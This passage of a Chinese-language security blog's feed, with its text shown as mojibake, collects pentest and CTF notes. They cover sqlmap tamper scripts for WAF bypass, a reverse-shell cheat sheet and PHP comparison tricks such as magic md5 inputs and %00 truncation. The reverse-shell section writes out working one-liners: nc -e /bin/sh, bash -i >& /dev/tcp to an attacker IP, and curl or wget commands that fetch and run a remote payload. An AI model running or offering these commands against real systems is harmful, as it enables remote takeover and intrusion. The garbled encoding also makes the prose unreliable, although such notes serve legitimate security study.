å¯ä»¥ä¸ç”¨æ‰‹åŠ¨é€‰æ‹©yesæˆ–noçš„é€‰é¡¹ã€‚</p><h3 id="sqlmap-tamper-çš„ä½¿ç”¨"><a href="#sqlmap-tamper-çš„ä½¿ç”¨" class="headerlink" title="sqlmap tamper çš„ä½¿ç”¨"></a>sqlmap tamper çš„ä½¿ç”¨</h3><p>å¯ä»¥è¿›è¡Œå„ç§ç»•è¿‡é˜²ç«å¢™å’Œwaf</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">--tamper</span> xxx<span class="selector-class">.py</span>  (.pyå¯ä»¥ä¸åŠ )</span><br></pre></td></tr></table></figure><p><code>eg:python sqlmap.py -u â€œâ€ â€“ tamper base64encode.py</code><br>1.æ™®é€šçš„<code>tamper</code>æ­é…æ–¹å¼:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,</span><br><span class="line"><span class="built_in">charencode,</span>charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,</span><br><span class="line"><span class="built_in">nonrecursivereplacement,</span>percentage,randomcase,securesphere,space2comment,space2plus,</span><br><span class="line"><span class="built_in">space2randomblank,</span>unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure><p>2.æ•°æ®åº“ä¸º<code>MSSQL</code>çš„æ­é…æ–¹å¼ï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,</span><br><span class="line"><span class="built_in">nonrecursivereplacement,</span>percentage,randomcase,securesphere,sp_password,space2comment,</span><br><span class="line"><span class="built_in">space2dash,</span>space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,</span><br><span class="line">unmagicquotes</span><br></pre></td></tr></table></figure><p>3.æ•°æ®åº“ä¸º<code>Mysql</code>çš„æ­é…æ–¹å¼:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,</span><br><span class="line"><span class="built_in">greatest,</span>halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,</span><br><span class="line"><span class="built_in">multiplespaces,</span>nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,</span><br><span class="line"><span class="built_in">space2morehash,</span>space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,</span><br><span class="line"><span class="built_in">versionedkeywords,</span>versionedmorekeywords,xforwardedfor</span><br></pre></td></tr></table></figure><p>4.å¸¸ç”¨è„šæœ¬ç”¨æ³•ï¼š</p><blockquote><p><code>apostrophemask.py UTF-8ç¼–ç </code><br><code>apostrophenullencode.py unicodeç¼–ç </code><br><code>appendnullbyte.py æ·»åŠ %00</code><br><code>base64encode.py base64ç¼–ç </code><br><code>between.py ä»¥â€not betweenâ€æ›¿æ¢â€&gt;â€œ</code><br><code>bluecoat.py ä»¥éšæœºçš„ç©ºç™½å­—ç¬¦æ›¿ä»£ç©ºæ ¼ï¼Œä»¥â€likeâ€æ›¿ä»£â€=â€œ</code><br><code>chardoubleencode.py åŒé‡urlç¼–ç </code><br><code>charencode.py urlç¼–ç </code><br><code>charunicodeencode.py å¯¹æœªè¿›è¡Œurlç¼–ç çš„å­—ç¬¦è¿›è¡Œunicodeç¼–ç </code><br><code>equaltolike.py ä»¥â€likeâ€æ›¿ä»£â€=â€œ</code><br><code>halfversionedmorekeywords.pyåœ¨æ¯ä¸ªå…³é”®å­—å‰æ·»åŠ æ¡ä»¶æ³¨é‡Š</code><br><code>ifnull2ifisnull.py ä»¥â€IF(ISNULL(A), B, A)â€æ›¿æ¢â€IFNULL(A, B)â€</code><br><code>modsecurityversioned.py æ¡ä»¶æ³¨é‡Š</code><br><code>modsecurityzeroversioned.py æ¡ä»¶æ³¨é‡Šï¼Œ0000</code><br><code>multiplespaces.py æ·»åŠ å¤šä¸ªç©ºæ ¼</code><br><code>nonrecursivereplacement.py å¯ä»¥ç»•è¿‡å¯¹å…³é”®å­—åˆ é™¤çš„é˜²æ³¨å…¥ï¼ˆè¿™ä¸ªæˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆè¯´å¥½ï¼Œçœ‹ä¾‹å­ã€‚ã€‚ã€‚ï¼‰</code><br><code>percentage.py åœ¨æ¯ä¸ªå­—ç¬¦å‰æ·»åŠ ç™¾åˆ†å·ï¼ˆ%ï¼‰</code><br><code>randomcase.py éšå³å¤§å°å†™</code><br><code>randomcomments.py éšæœºæ’å…¥åŒºå—æ³¨é‡Š</code><br><code>sp_password.py è¯­å¥ç»“å°¾æ·»åŠ â€sp_passwordâ€è¿·æƒ‘æ•°æ®åº“æ—¥å¿—ï¼ˆå¾ˆã€‚ã€‚ã€‚ï¼‰</code><br><code>space2comment.py ä»¥åŒºå—æ³¨é‡Šæ›¿æ¢ç©ºæ ¼</code><br><code>space2dash.py ä»¥å•è¡Œæ³¨é‡Šâ€â€“â€å’Œéšæœºçš„æ–°è¡Œæ›¿æ¢ç©ºæ ¼</code><br><code>space2hash.py ä»¥å•è¡Œæ³¨é‡Šâ€#â€å’Œç”±éšæœºå­—ç¬¦ç»„æˆçš„æ–°è¡Œæ›¿æ¢ç©ºæ ¼</code><br><code>space2morehash.py æ²¡çœ‹å‡ºæ¥å’Œä¸Šé¢é‚£ä¸ªæœ‰ä»€ä¹ˆåŒºåˆ«ã€‚ã€‚</code><br><code>space2mssqlblank.py ä»¥éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼</code><br><code>space2mssqlhash.py ä»¥å•è¡Œæ³¨é‡Šâ€#â€å’Œæ–°è¡Œæ›¿æ¢ç©ºæ ¼</code><br><code>space2mysqlblank.py ä»¥éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼</code><br><code>space2mysqldash.py ä»¥å•è¡Œæ³¨é‡Šå’Œæ–°è¡Œæ›¿æ¢ç©ºæ ¼</code><br><code>space2plus.py ä»¥â€+â€æ›¿æ¢ç©ºæ ¼</code><br><code>space2randomblank.py éšæœºç©ºç™½å­—ç¬¦æ›¿æ¢ç©ºæ ¼</code><br><code>unionalltounion.py ä»¥â€union allâ€æ›¿æ¢â€unionâ€</code><br><code>unmagicquotes.py ä»¥â€%bf%27â€æ›¿æ¢å•å¼•å·ï¼Œå¹¶åœ¨ç»“å°¾æ·»åŠ æ³¨é‡Šâ€â€“â€</code><br><code>versionedkeywords.py å¯¹ä¸æ˜¯å‡½æ•°çš„å…³é”®å­—æ¡ä»¶æ³¨é‡Š</code><br><code>versionedmorekeywords.py å¯¹å…³é”®å­—æ¡ä»¶æ³¨é‡Š</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åå¼¹shell</title>
      <link href="/2023/02/13/Reverses-shell/"/>
      <url>/2023/02/13/Reverses-shell/</url>
      
        <content type="html"><![CDATA[<h1 id="åå¼¹shellå§¿åŠ¿"><a href="#åå¼¹shellå§¿åŠ¿" class="headerlink" title="åå¼¹shellå§¿åŠ¿"></a>åå¼¹shellå§¿åŠ¿</h1><h2 id="netcat-ä¸€å¥è¯åå¼¹"><a href="#netcat-ä¸€å¥è¯åå¼¹" class="headerlink" title="netcat ä¸€å¥è¯åå¼¹"></a>netcat ä¸€å¥è¯åå¼¹</h2><p>è·å–<code>shell</code>ï¼ˆæƒ³åå¼¹è°çš„<code>shell</code>å°±åœ¨è°çš„åé¢åŠ <code>-e /bin/sh</code>æˆ–<code>-e /bin/bash</code>ï¼‰</p><h3 id="æ­£å‘shell"><a href="#æ­£å‘shell" class="headerlink" title="æ­£å‘shell"></a>æ­£å‘<code>shell</code></h3><p> å®¢æˆ·ç«¯ä¸»åŠ¨è¿æ¥æœåŠ¡å™¨å¹¶è·å–æœåŠ¡å™¨shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å®¢æˆ·ç«¯ä¸»åŠ¨è¿æ¥å¹¶å¾—åˆ°åå¼¹shell    </span><br><span class="line">    nc æœåŠ¡ç«¯ip <span class="number">8888</span></span><br><span class="line">æœåŠ¡ç«¯ç›‘å¬è¿æ¥</span><br><span class="line">    nc -lvp <span class="number">8888</span> -e <span class="regexp">/bin/</span>sh </span><br><span class="line">    <span class="comment"># windowsä¸Šï¼šnc -lvp 8888 -e c:\windows\system32\cmd.exe </span></span><br></pre></td></tr></table></figure><h3 id="åå‘shell"><a href="#åå‘shell" class="headerlink" title="åå‘shell"></a>åå‘<code>shell</code></h3><p>æœåŠ¡å™¨ç«¯è¿æ¥å¹¶åå¼¹<code>shell</code>ç»™å®¢æˆ·ç«¯</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">å®¢æˆ·ç«¯ç›‘å¬</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-lvp</span> <span class="number">8888</span> </span><br><span class="line"><span class="string">æœåŠ¡ç«¯è¿æ¥å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="string">nc</span> <span class="string">å®¢æˆ·ç«¯ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">/bin/sh</span> </span><br><span class="line"></span><br><span class="line"><span class="string">windowsä¸Šï¼šnc</span> <span class="string">ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">c:\windows\system32\cmd.exe</span></span><br></pre></td></tr></table></figure><h2 id="bashåå¼¹shell"><a href="#bashåå¼¹shell" class="headerlink" title="bashåå¼¹shell"></a>bashåå¼¹shell</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/æˆ‘ä»¬é¶æœºip/</span>æˆ‘ä»¬é¶æœº port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p><code>bash</code>ä¸€å¥è¯å‘½ä»¤è¯¦è§£<br>ä»¥ä¸‹é’ˆå¯¹å¸¸ç”¨çš„<code>bash</code>åå¼¹ä¸€å¥è¯è¿›è¡Œäº†æ‹†åˆ†è¯´æ˜ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹</p><p><img src="/2023/02/13/Reverses-shell/image-20221019235717724.png" alt="image-20221019235717724"></p><blockquote><p>å…¶å®ä»¥ä¸Šbashåå¼¹ä¸€å¥å®Œæ•´çš„è§£è¯»è¿‡ç¨‹å°±æ˜¯ï¼š<br>bashäº§ç”Ÿäº†ä¸€ä¸ªäº¤äº’ç¯å¢ƒä¸æœ¬åœ°ä¸»æœºä¸»åŠ¨å‘èµ·ä¸ç›®æ ‡ä¸»æœº<code>8080</code>ç«¯å£å»ºç«‹çš„è¿æ¥ï¼ˆå³TCP 8080 ä¼šè¯è¿æ¥ï¼‰ç›¸ç»“åˆï¼Œç„¶ååœ¨é‡å®šå‘ä¸ª<code>tcp 8080</code>ä¼šè¯è¿æ¥ï¼Œæœ€åå°†ç”¨æˆ·é”®ç›˜è¾“å…¥ä¸ç”¨æˆ·æ ‡å‡†è¾“å‡ºç›¸ç»“åˆå†æ¬¡é‡å®šå‘ç»™ä¸€ä¸ªæ ‡å‡†çš„è¾“å‡ºï¼Œå³å¾—åˆ°ä¸€ä¸ªbashåå¼¹ç¯å¢ƒã€‚</p></blockquote><p>åœ¨åå¼¹<code>shell</code>æ—¶è¦å€ŸåŠ©<code>netcat</code>å·¥å…·åå¼¹</p><h2 id="curlåå¼¹shell"><a href="#curlåå¼¹shell" class="headerlink" title="curlåå¼¹shell"></a>curlåå¼¹shell</h2><p>å‰æè¦åˆ©ç”¨<code>bash</code>ä¸€å¥è¯çš„æƒ…å†µä¸‹ä½¿ç”¨<code>curl</code>åå¼¹<code>shell</code></p><p>åœ¨å­˜åœ¨<code>å‘½ä»¤æ‰§è¡Œ</code>çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œ</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl [è‡ªå·±çš„æœåŠ¡å™¨]ip<span class="string">|bash</span></span><br><span class="line"><span class="comment">//åœ¨åˆ©ç”¨curlé‡Œæ‰§è¡Œæˆ‘è‡ªå·±çš„æœåŠ¡å™¨ä¸Šçš„bashä¸€å¥è¯</span></span><br></pre></td></tr></table></figure><p>è¯¥<code>ip</code>çš„<code>index</code>æ–‡ä»¶ä¸Šå«æœ‰<code>bash</code>ä¸€å¥è¯ï¼Œå°±å¯ä»¥åå¼¹<code>shell</code>ã€‚</p><p>ä¾‹å¦‚åœ¨è‡ªå·±çš„æœåŠ¡å™¨<code>indexæ–‡ä»¶</code>ä¸Šå†™ä¸Šä¸€å¥è¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.20.151</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p> <code>192.168.20.151</code>å°±æ˜¯ä½œä¸ºç›‘å¬ç«¯å£çš„æœåŠ¡å™¨ã€æ”»å‡»æœºã€‘ç”¨æ¥å¾—åˆ°åå¼¹çš„shellã€‚</p><p><img src="/2023/02/13/Reverses-shell/image-20221020000027288.png" alt="image-20221020000027288"></p><p> å­˜åœ¨ä¸€å¥è¯ï¼Œåˆ©ç”¨<code>curl</code>åå¼¹ã€‚<br><code>kali</code>å¼€å¯ç›‘å¬</p><p><img src="/2023/02/13/Reverses-shell/image-20221020000337460.png" alt="image-20221020000337460"></p><h2 id="wgetæ–¹å¼åå¼¹shell"><a href="#wgetæ–¹å¼åå¼¹shell" class="headerlink" title="wgetæ–¹å¼åå¼¹shell"></a><code>wget</code>æ–¹å¼åå¼¹<code>shell</code></h2><p>åˆ©ç”¨<code>wget</code>è¿›è¡Œä¸‹è½½æ‰§è¡Œ</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="number">192.168</span>.<span class="number">20.130</span><span class="regexp">/shell.txt -O /</span>tmp<span class="regexp">/x.php &amp;&amp; php /</span>tmp/x.php</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä¸‹é¢è´´å‡ºçš„<code>php</code>è¿›è¡Œåå¼¹ã€‚<br>å¼€å¯ç›‘å¬</p><p> <img src="/2023/02/13/Reverses-shell/image-20221020000353533.png" alt="image-20221020000353533"></p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPå‡½æ•°è®°å½•</title>
      <link href="/2023/02/13/php-functions/"/>
      <url>/2023/02/13/php-functions/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPå‡½æ•°è®°å½•"><a href="#PHPå‡½æ•°è®°å½•" class="headerlink" title="PHPå‡½æ•°è®°å½•"></a>PHPå‡½æ•°è®°å½•</h1><h2 id="1-phpå‡½æ•°md5"><a href="#1-phpå‡½æ•°md5" class="headerlink" title="1)phpå‡½æ•°md5"></a>1)phpå‡½æ•°md5</h2><blockquote><p>ps.<br>sha1ï¼Œç”±äºæ­¤å‡½æ•°ä¾èµ–çš„ç®—æ³•å·²ä¸è¶³å¤Ÿå¤æ‚,ä¸æ¨èä½¿ç”¨æ­¤å‡½æ•°å¯¹æ˜æ–‡å¯†ç åŠ å¯†ã€‚ç›®å‰å¤§å¤šç”¨md5</p><p>ä½†æ˜¯å’Œmd5ä¸€æ ·ï¼Œsha1å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œé‡åˆ°æ•°ç»„ä¼šè¿”å›NULL</p></blockquote><p>åšé¢˜æ—¶ï¼Œäº†è§£åˆ°äº†ä¸€ä¸ªæ–°çš„å‡½æ•°<code>md5</code></p><blockquote><p>php md5å‡½æ•°ä»‹ç»ä¸ºï¼š</p><p>md5( string , raw )</p><p>string : è§„å®šéœ€è¦è®¡ç®—çš„å­—ç¬¦ä¸²</p><p>raw : è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ã€‚</p><p>â€‹        trueï¼š16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼</p><p>â€‹        false(é»˜è®¤): 32å­—ç¬¦åå…­è¿›åˆ¶æ•°</p></blockquote><p>æ¯”è¾ƒå¸¸ç”¨çš„</p><p>æ•°å­—å‹ï¼š<code>129581926211651571912466741651878684928</code></p><p><img src="/2023/02/13/php-functions/image-20220811135742130.png" alt="image-20220811135742130"></p><p>å­—ç¬¦å‹ï¼š<code>ffifdyop</code></p><p><img src="/2023/02/13/php-functions/image-20220811135813137.png" alt="image-20220811135813137"></p><p>å‘ç°éƒ½æœ‰â€™<code>or</code>â€˜çš„å½¢å¼ï¼Œå¯ä»¥æ„é€ å¿…çœŸçš„ç»“æœ</p><blockquote><p>MD5å‡½æ•°æœ‰ä¸€ä¸ªæ¼æ´ï¼Œå½“è¾“å…¥çš„ä¸ºæ•°ç»„æ—¶ï¼Œä¼šè¿”å›ä¸ºNULL</p><p>æ‰€ä»¥å½“é‡åˆ°md5(p1)&#x3D;&#x3D;&#x3D;md5(p2)ï¼ŒæŠŠp1å’Œp2è¿›è¡Œå¼ºæ¯”è¾ƒæ—¶ï¼Œåˆè¦æ±‚p1å’Œp2ä¸ç›¸ç­‰</p><p>ç”±äºä¸¤ä¸ªä¸åŒçš„å­—ç¬¦MD5å€¼å¾ˆéš¾ä¸€è‡´ï¼Œäºæ˜¯è¾“å…¥p1[]å’Œp2[]ä¸¤ä¸ªåå­—ä¸€è‡´çš„å­—ç¬¦ï¼Œéšä¾¿èµ‹å€¼ï¼Œ<br>p1[]&#x3D;1&amp;p2[]&#x3D;2<br>è¿”å›ä¸ºç©ºï¼Œä½¿å¾—å¼ºæ¯”è¾ƒæˆç«‹</p><hr><p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢<br>æˆ‘æƒ³èµ·ä¹‹å‰çš„é‡åˆ°ä¸€ä¸ªé¢˜ï¼Œä¹Ÿæœ‰æ•°ç»„ï¼Œé—®äº†ä¸€ä¸‹å¤§ä½¬</p><p>å¤§ä½¬è¯´ï¼Œå› ä¸ºæ²¡æœ‰å¯¹æ•°ç»„ä¸­çš„å…ƒç´ æ•°é‡å£°æ˜ï¼Œå‡½æ•°ä¸çŸ¥é“æ•°ç»„å…ƒç´ ç¬¬å‡ ä¸ªçš„å€¼æ˜¯1ï¼ˆæˆ–2ï¼‰<br>å¯¼è‡´å‡½æ•°åˆ°å¤„æ‰«ï¼Œæœ€åè¿”å›NULLã€å› ä¸ºè¿™ä¸ªå…ƒç´ ä½ç½®æˆ‘ä»¬æ ¹æœ¬å°±æ²¡å®šã€‘</p><p>ä¸‹é¢ä¸¾å‡ ä¸ªä¾‹å­ï¼Œä»¥æˆ‘ä¸ªäººç†è§£<br>å¦‚æœæ˜¯<br>p1[0]&#x3D;1&amp;p2[0]&#x3D;2<br>æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºåªå®šä¹‰äº†0å·ä½çš„æ•°æ®ï¼Œè€Œä¸”ä¸ç›¸ç­‰ï¼Œå…¶ä»–ä½ç½®æ•°æ®æ²¡å®šä¹‰ï¼Œæ‰€ä»¥æ¯”è¾ƒä¹Ÿä¸å¯èƒ½å‡ºç°ç›¸ç­‰</p><p>p1[0]&#x3D;1&amp;p2[1]&#x3D;1<br>æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºè¿™é‡Œp1[]å®šä¹‰äº†0å·ä½ä¸º1ï¼Œè€Œp2å®šä¹‰çš„æ˜¯1å·ä½ä¸º1ï¼Œæ¯”è¾ƒæ˜¯æŒ‰é¡ºåºæ¯”è¾ƒçš„ï¼Œä¸¤ä¸ªæ•°å€¼è™½ç„¶ä¸€æ ·ï¼Œä½†æ˜¯ä½ç½®ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æ¯”è¾ƒè¿˜æ˜¯ä¸ç›¸ç­‰</p></blockquote><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯<span class="number">0</span>eå¼€å¤´çš„ï¼š</span><br><span class="line"></span><br><span class="line"> QNKCDZO</span><br><span class="line"> <span class="number">240610708</span></span><br><span class="line"> s878926199a</span><br><span class="line"> s155964671a</span><br><span class="line"> s214587387a</span><br><span class="line"> s1091221200a</span><br></pre></td></tr></table></figure><h2 id="2-phpå‡½æ•°eregï¼Œnullæˆªæ–­"><a href="#2-phpå‡½æ•°eregï¼Œnullæˆªæ–­" class="headerlink" title="2)phpå‡½æ•°eregï¼Œnullæˆªæ–­"></a>2)phpå‡½æ•°eregï¼Œnullæˆªæ–­</h2><p><strong>æ­¤å‡½æ•°åœ¨ PHP 5.3.0ä¸­å·²å¼ƒç”¨ï¼Œå¹¶åœ¨PHP 7.0.0ä¸­åˆ é™¤ã€‚</strong></p><p><strong>[æ‰€ä»¥é‡åˆ°æ— æ³•æ‰§è¡Œæ—¶ï¼Œå¯èƒ½æ˜¯å‡ºé¢˜äººæ²¡æœ‰æ³¨æ„éƒ¨ç½²é¢˜ç›®ç¯å¢ƒ]</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ereg()å‡½æ•°ç”¨æŒ‡å®šçš„æ¨¡å¼æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„å­—ç¬¦ä¸²<span class="punctuation">,</span>å¦‚æœåŒ¹é…æˆåŠŸè¿”å›<span class="keyword">true</span><span class="punctuation">,</span>å¦åˆ™<span class="punctuation">,</span>åˆ™è¿”å›<span class="keyword">false</span>ã€‚æœç´¢å­—æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚ </span><br><span class="line"></span><br><span class="line">eregå‡½æ•°å­˜åœ¨NULLæˆªæ–­æ¼æ´ï¼Œå¯¼è‡´äº†æ­£åˆ™è¿‡æ»¤è¢«ç»•è¿‡<span class="punctuation">,</span>æ‰€ä»¥å¯ä»¥ä½¿ç”¨<span class="variable">%00</span>æˆªæ–­æ­£åˆ™åŒ¹é…</span><br><span class="line"></span><br><span class="line">æ¯”å¦‚</span><br><span class="line">ereg (<span class="string">&quot;^[a-zA-Z]+$&quot;</span><span class="punctuation">,</span> $_GET[&#x27;<span class="keyword">c</span>&#x27;])</span><br><span class="line"></span><br><span class="line">å½“<span class="keyword">c</span><span class="operator">=</span>a<span class="variable">%00123</span>æ—¶</span><br><span class="line">eregåªä¼šæ£€æµ‹åˆ°ç¬¬ä¸€ä¸ªaä¸ºæ­¢ï¼Œåé¢çš„æ•°æ®éƒ½è¢«<span class="variable">%00</span>æˆªæ–­äº†ï¼Œä»è€Œç»•è¿‡åŒ¹é…</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ç°åœ¨ä¸€èˆ¬ä¸å†ä½¿ç”¨<code>ereg</code>ï¼Œåªæ˜¯åšä¸º<code>preg_match</code>æ›¿ä»£å‡½æ•°ä½¿ç”¨</p><h2 id="3-phpå‡½æ•°sleep"><a href="#3-phpå‡½æ•°sleep" class="headerlink" title="3)phpå‡½æ•°sleep"></a>3)phpå‡½æ•°sleep</h2><blockquote><p>å½“é‡åˆ°è¿™ç§éœ€è¦æˆ‘ä»¬è¾“å…¥å‚æ•°ï¼Œä½†æ˜¯è®©å‚æ•°å€¼å¿…é¡»å¾ˆå¤§ï¼Œ</p><p>è€Œä¸”æœ€ååˆä»¥è¿™ä¸ªå‚æ•°æ‰§è¡Œsleepå‡½æ•°ï¼Œå°±ä¼šè®©æˆ‘ä»¬ç­‰å¾ˆä¹…</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">sleep</span><span class="params">((int)</span></span><span class="variable">$time</span>)</span><br></pre></td></tr></table></figure><p><code>sleep()</code>è¦å»¶ç¼“å…¶ç¨‹åºæ‰§è¡Œçš„æ—¶é—´ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬åˆä¸èƒ½ç­‰å¤ªä¹…ï¼Œå¯ä»¥æ„é€ phpä¸­çš„ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼Œå°±æ„é€ ä¸€ä¸ª  </p><blockquote><p><code>time=0.3e7 ï¼ˆç­‰ä»·äº0.3ä¹˜10çš„7æ¬¡æ–¹ï¼‰</code> </p></blockquote><p>è¿™æ ·å®ƒçš„å€¼è¾¾åˆ°äº†åˆ¤æ–­çš„æ ‡å‡†ã€‚</p><p>è€Œä¸”å½“å®ƒ<strong>å¼ºåˆ¶è½¬åŒ–ä¸ºæ•´æ•°å‹</strong>(<code>int</code>)çš„æ—¶å€™å°±ä¼šå› ä¸ºå¼€å¤´ä¸º<code>0.3</code>æ˜¯<strong>å°æ•°å˜æˆé›¶</strong>ï¼Œè¿™æ ·å¯ä»¥æ»¡è¶³æ¡ä»¶ã€‚</p><h2 id="4-phpå‡½æ•°is-numeric"><a href="#4-phpå‡½æ•°is-numeric" class="headerlink" title="4)phpå‡½æ•°is_numeric()"></a>4)phpå‡½æ•°is_numeric()</h2><p>å½“é‡åˆ°ç±»ä¼¼</p><blockquote><p><code>0e..;1e;..2e..;...</code></p></blockquote><p>å‡½æ•°ä¼šæŠŠå…¶å½“ä½œç§‘å­¦è®¡æ•°æ³•</p><p>è¿™æ ·å½“é‡åˆ°</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$num</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">if</span>(<span class="variable">$num</span>)&#123;</span><br><span class="line">            <span class="built_in">if</span>(!<span class="built_in">is_numeric</span>(<span class="variable">$time</span>))</span><br></pre></td></tr></table></figure><p>è¿™ç§</p><blockquote><p>ç¬¬ä¸€ä¸ªè¦å¼±ç±»å‹ä¸º<code>0</code></p><p>ç¬¬äºŒä¸ªè¦ä¸ä¸º<code>0</code>æ‰èƒ½æ‰§è¡ŒçœŸçš„åˆ¤æ–­</p><p>ç¬¬ä¸‰ä¸ªè¦æ±‚å…¶ä¸ºæ•°å­—</p></blockquote><p>å°±å¯ä»¥ç”¨ç±»ä¼¼<code>0e2</code>ï¼Œç»•è¿‡è¿™ä¸‰ä¸ª</p><h2 id="5-eval-å‡½æ•°å’Œsystem-å‡½æ•°çš„æ¯”è¾ƒ"><a href="#5-eval-å‡½æ•°å’Œsystem-å‡½æ•°çš„æ¯”è¾ƒ" class="headerlink" title="5)eval()å‡½æ•°å’Œsystem()å‡½æ•°çš„æ¯”è¾ƒ"></a>5)eval()å‡½æ•°å’Œsystem()å‡½æ•°çš„æ¯”è¾ƒ</h2><p><code>è®°å½•ä¸€æ¬¡åœ¨æ‰“é¶æœºæ—¶ï¼Œå› ä¸ºå¹³å¸¸ä¹ æƒ¯ç”¨ eval()å‡½æ•°ï¼Œä½†æ˜¯é¶æœºæ‰§è¡Œncç­‰å‘½ä»¤æ—¶ï¼Œeval()å‡½æ•°æ²¡æœ‰ååº”ï¼Œå°±æ˜¯å› ä¸ºå…¶æ˜¯ä»£ç æ‰§è¡Œï¼Œè€Œéå‘½ä»¤æ‰§è¡Œï¼Œæ‰€ä»¥æŠŠä¸¤è€…æœ¬è´¨çš„ç”¨æ³•ææ‡‚è¿˜æ˜¯å¾ˆå¿…è¦çš„</code></p><blockquote><p>evalç±»å‹å‡½æ•°æ˜¯ä»£ç æ‰§è¡Œè€Œä¸æ˜¯å‘½ä»¤æ‰§è¡Œï¼ˆä¸€å¥è¯æœ¨é©¬ï¼‰</p><p>systemç±»å‹å‡½æ•°æ˜¯å‘½ä»¤æ‰§è¡Œè€Œä¸æ˜¯ä»£ç æ‰§è¡Œ</p><p>evalå‡½æ•°é‡Œå¿…é¡»æ˜¯ä¸€ä¸ªç¬¦åˆphpè¯­æ³•çš„è¯­å¥ï¼Œå¦‚æœè¯­å¥ç»“å°¾æ²¡æœ‰åˆ†å·ä¼šæŠ¥é”™ï¼ševal()â€™d 